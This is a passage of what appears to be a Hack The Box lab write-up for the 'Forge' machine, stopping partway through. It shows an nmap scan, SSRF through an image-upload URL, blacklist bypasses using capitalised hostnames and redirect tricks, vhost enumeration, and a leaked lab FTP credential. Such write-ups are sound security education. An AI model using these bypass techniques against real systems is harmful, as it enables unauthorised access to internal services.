<!doctype html><html lang=es>
<head>
<title>Forge | 7Rocky</title><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Medium machine. This machine has a Server-Side Request Forgery (SSRF) vulnerability from a subdomain to an FTP server. After that, there are sudo permissions to run a Python script with a debugger. Basic web pentesting bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit the SSRF">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Forge/Forge.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Forge">
<meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine has a Server-Side Request Forgery (SSRF) vulnerability from a subdomain to an FTP server. After that, there are sudo permissions to run a Python script with a debugger. Basic web pentesting bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit the SSRF">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/en/htb/forge/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2022-01-22T00:00:00+01:00">
<meta property="article:modified_time" content="2022-03-03T11:23:15+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Forge/Forge.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Forge">
<meta itemprop=description content="Hack The Box. Linux. Medium machine. This machine has a Server-Side Request Forgery (SSRF) vulnerability from a subdomain to an FTP server. After that, there are sudo permissions to run a Python script with a debugger. Basic web pentesting bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit the SSRF"><meta itemprop=datePublished content="2022-01-22T00:00:00+01:00">
<meta itemprop=dateModified content="2022-03-03T11:23:15+01:00">
<meta itemprop=wordCount content="1481">
<meta itemprop=keywords content="ftp,sudo,python,ssrf,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Forge">
<meta name=twitter:description content="Hack The Box. Linux. Medium machine. This machine has a Server-Side Request Forgery (SSRF) vulnerability from a subdomain to an FTP server. After that, there are sudo permissions to run a Python script with a debugger. Basic web pentesting bypassing techniques are needed to compromise this machine. This write-up uses a custom Python script to exploit the SSRF">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Forge/Forge.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div></head><body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/htb/forge/ title=es>
<img alt=es height=32px src=/images/es.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a>
</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></nav></div></header><main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/forge/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/forge/&text=Forge" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/forge/&title=Forge" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div><h1 class="f1 mt3 mb1">Forge</h1><time class="f6 mv4 dib tracked" datetime=2022-01-22T00:00:00+01:00>22 / 01 / 2022</time>
</header><div class=htb-image>
<img alt=Forge src=/images/HTB/Forge/Forge.png>
</div><ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ftp title=FTP>FTP</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/sudo title=sudo>sudo</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/python title=Python>Python</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ssrf title="Server-Side Request Forgery">Server-Side Request Forgery</a>
</li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#testing-ssrf>Testing SSRF</a></li><li><a href=#finding-another-subdomain>Finding another subdomain</a></li><li><a href=#access-to-the-machine>Access to the machine</a></li><li><a href=#privilege-escalation-with-sudo>Privilege escalation with <code>sudo</code></a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>OS</strong>: Linux
</li><li>
<strong>Difficulty</strong>: Medium
</li><li>
<strong>IP Address</strong>: 10.10.11.111
</li><li>
<strong>Release</strong>: 11 / 09 / 2021
</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.111 -p21,22,80
</span></span><span style=display:flex><span>Nmap scan report for forge.htb (10.10.11.111)
</span></span><span style=display:flex><span>Host is up (0.075s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE    SERVICE VERSION
</span></span><span style=display:flex><span>21/tcp filtered ftp
</span></span><span style=display:flex><span>22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
</span></span><span style=display:flex><span>|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
</span></span><span style=display:flex><span>|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
</span></span><span style=display:flex><span>80/tcp open     http    Apache httpd 2.4.41
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Gallery
</span></span><span style=display:flex><span>Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 10.24 seconds
</span></span></code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open. Port 21 (FTP) is filtered.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.111</code>, the machine contains a website that redirects to <code>http://forge.htb</code>. After putting the hostname in <code>/etc/hosts</code> we will see this website:</p><p><img src=/images/HTB/Forge/Forge-index.png alt="Forge index"></p><p>It allows us to upload images to the server. We can upload a local file or use an URL:</p><p><img src=/images/HTB/Forge/Forge-upload.png alt="Forge upload"></p><p>We put an URL to our attacker machine, and we got a hit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.111 - - [] "GET /Forge.png HTTP/1.1" 200 -  
</code></pre></div><p>Then, the server generates a random URL where the image is located:</p><p><img src=/images/HTB/Forge/Forge-image-url.png alt="Forge upload"></p><p>It is also possible to upload files that are not an image. For example, this HTML document:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;!</span><span class=mtk5>doctype</span> <span class=mtk8>html</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;</span><span class=mtk5>html</span> <span class=mtk8>lang</span><span class=mtk1>=</span><span class=mtk4>"en"</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>head</span><span class=mtk1>&gt;</span>
    <span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;Test&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;</span>  
    <span class=mtk1>&lt;</span><span class=mtk5>meta</span> <span class=mtk8>charset</span><span class=mtk1>=</span><span class=mtk4>"uft-8"</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;/</span><span class=mtk5>head</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>body</span><span class=mtk1>&gt;</span>
    <span class=mtk1>&lt;</span><span class=mtk5>h1</span><span class=mtk1>&gt;Test&lt;/</span><span class=mtk5>h1</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;/</span><span class=mtk5>body</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;/</span><span class=mtk5>html</span><span class=mtk1>&gt;</span>
</code></pre></div><p>Although the browser will complain that the file is not an image, using <code>curl</code> we can see the uploaded HTML document:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://forge.htb/uploads/lquBPTyay70DnGJwpCFG  
&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;title&gt;Test&lt;/title&gt;
    &lt;meta charset="uft-8"&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Test&lt;/h1&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div><h2 id=testing-ssrf>Testing SSRF</h2><p>Now, we can try some Server Side Request Forgery (SSRF) payloads because it is likely to be vulnerable (the name of the machine is &ldquo;Forge&rdquo;). To automate the process, we can use this short Python script: <a href=https://github.com/7Rocky/HackTheBox-scripts/blob/main/Machines/Forge/ssrf.py><code>ssrf.py</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/blob/main/Machines/Forge#ssrfpy>here</a>). This script only uploads the image URL and requests it using the generated URL.</p><p>We test some URL and see that there are some blacklisted addresses:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://forge.htb
URL contains a blacklisted address!  

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://localhost
URL contains a blacklisted address!

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://127.0.0.1
URL contains a blacklisted address!
</code></pre></div><p>Although this blacklist can be bypassed using <code>http://10.10.11.111</code> or <code>http://127.0.1.1</code>, there is nothing interesting to do.</p><p>As a curiosity, the Apache server does not include a trailing slash when doing the redirect, and we have this error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://10.10.11.111/static
An error occured! Error : HTTPConnectionPool(host=&#39;forge.htbstatic&#39;, port=80): Max retries exceeded with url: / (Caused by NewConnectionError(&#39;&lt;urllib3.connection.HTTPConnection object at 0x7f67f9ede100&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution&#39;))  
</code></pre></div><p>Using <code>curl</code> we see that the issue is in the redirection process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -I http://10.10.11.111/static
HTTP/1.1 302 Found
<span class=code-white>Date</span>:
<span class=code-white>Server</span>: Apache/2.4.41 (Ubuntu)
<span class=code-white>Location</span>: http://forge.htbstatic
<span class=code-white>Content-Type</span>: text/html; charset=iso-8859-1  
</code></pre></div><p>The problem can be solved adding <code>:80</code>, so that it is appended to <code>http://forge.htb</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> -I 'http://10.10.11.111/:80/static'
HTTP/1.1 302 Found
<span class=code-white>Date</span>:
<span class=code-white>Server</span>: Apache/2.4.41 (Ubuntu)
<span class=code-white>Location</span>: http://forge.htb:80/static
<span class=code-white>Content-Type</span>: text/html; charset=iso-8859-1

<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://10.10.11.111/:80/static
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Index of /static&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
&lt;h1&gt;Index of /static&lt;/h1&gt;
  &lt;table&gt;
   &lt;tr&gt;&lt;th valign="top"&gt;&lt;img src="/icons/blank.gif" alt="[ICO]"&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=N;O=D"&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=M;O=A"&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=S;O=A"&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href="?C=D;O=A"&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;  
   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/back.gif" alt="[PARENTDIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="/"&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="css/"&gt;css/&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2021-05-27 04:00  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="images/"&gt;images/&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2021-05-31 10:31  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;img src="/icons/folder.gif" alt="[DIR]"&gt;&lt;/td&gt;&lt;td&gt;&lt;a href="js/"&gt;js/&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;2021-05-27 06:39  &lt;/td&gt;&lt;td align="right"&gt;  - &lt;/td&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;
   &lt;tr&gt;&lt;th colspan="5"&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;/table&gt;
&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at forge.htb Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre></div><p>As previouslly said, there is nothing to do with <code>http://forge.htb</code>. We can try to access FTP, but again it is not allowed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py ftp://forge.htb
Invalid protocol! Supported protocols: http, https  
</code></pre></div><h2 id=finding-another-subdomain>Finding another subdomain</h2><p>So, there must be another subdomain. We can find it using <code>gobuster</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gobuster</span> vhost -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -r -q -u forge.htb  
Found: admin.forge.htb (Status: 200) [Size: 27]
</code></pre></div><p>After setting the subdomain in <code>/etc/hosts</code>, we see that only <code>localhost</code> can get the contents of the website:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://admin.forge.htb/  
Only localhost is allowed!
</code></pre></div><p>Hence, we must use SSRF to access <code>http://admin.forge.htb</code>, but it is blacklisted:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://admin.forge.htb  
URL contains a blacklisted address!
</code></pre></div><p>Although it is blacklisted, it seems that the validation is not perfect because it does not check capital letters:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://ADMIN.FORGE.HTB
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Admin Portal&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;link rel="stylesheet" type="text/css" href="/static/css/main.css"&gt;
    &lt;header&gt;
            &lt;nav&gt;
                &lt;h1 class=""&gt;&lt;a href="/"&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class="align-right margin-right"&gt;&lt;a href="/announcements"&gt;Announcements&lt;/a&gt;&lt;/h1&gt;  
                &lt;h1 class="align-right"&gt;&lt;a href="/upload"&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
            &lt;/nav&gt;
    &lt;/header&gt;
    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div><p>This way, we are able to enumerate the internal subdomain <code>admin-forge.htb</code>. We see that it shows a route called <code>/announcments</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> ssrf.py http://ADMIN.FORGE.HTB/announcements
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Announcements&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;link rel="stylesheet" type="text/css" href="/static/css/main.css"&gt;
    &lt;link rel="stylesheet" type="text/css" href="/static/css/announcements.css"&gt;
    &lt;header&gt;
            &lt;nav&gt;
                &lt;h1 class=""&gt;&lt;a href="/"&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class="align-right margin-right"&gt;&lt;a href="/announcements"&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
                &lt;h1 class="align-right"&gt;&lt;a href="/upload"&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
            &lt;/nav&gt;
    &lt;/header&gt;
    &lt;br&gt;&lt;br&gt;&lt;br&gt;
    &lt;ul&gt;
        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt;
        &lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.&lt;/li&gt;  
    &lt;/ul&gt;
&lt;/body&gt;
&lt;/html&gt;
